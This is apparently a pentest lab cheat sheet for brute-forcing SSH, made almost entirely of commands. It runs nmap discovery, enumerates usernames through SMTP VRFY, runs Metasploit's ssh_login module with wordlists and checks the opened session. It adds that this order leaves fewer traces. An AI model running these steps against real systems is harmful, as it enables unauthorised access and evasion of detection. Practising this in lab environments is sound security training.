# SSH Brute-Force (Port 22)

## Discovery

- `nmap -A -p- -T5 [target IP]` → SSH (22) found open.

## Enumeration

- `smtp-user-enum -M VRFY -U /usr/share/wordlists/fern-wifi/common.txt -t [target IP]` → Confirms real usernames via SMTP's VRFY command, allowing the SSH attack to use verified usernames instead of random guesses.

## Attack

- `msfconsole` → Launches the Metasploit console
- `search ssh` → Searches for SSH-related modules
- `use auxiliary/scanner/ssh/ssh_login` → Selects the SSH login (brute-force) module
- `show options` → Displays required parameters
- `set rhosts [target IP]` → Sets the target IP
- `set USER_FILE /usr/share/wordlists/sshusers.txt` → Sets the file containing usernames verified via SMTP enumeration
- `set PASS_FILE /usr/share/wordlists/sshpassword.txt` → Sets the wordlist file of passwords to try
- `exploit` → Starts the brute-force attack in the foreground, showing each username/password attempt live

## Verification

- `sessions -l` → Lists active sessions
- `sessions -i [id]` → Connects to the session opened with the discovered credentials
- `whoami` → Confirms which user was logged in as (not root — `msfadmin`)
- `uname -a` → Displays the target system's kernel information
- `ls` → Confirms file access

**Why SMTP first:** A generic wordlist could be fed directly into SSH, but that's inefficient and noisy. SMTP's VRFY command tests the same list much faster and reveals which usernames actually exist — making the resulting SSH attack faster and leave far fewer traces.
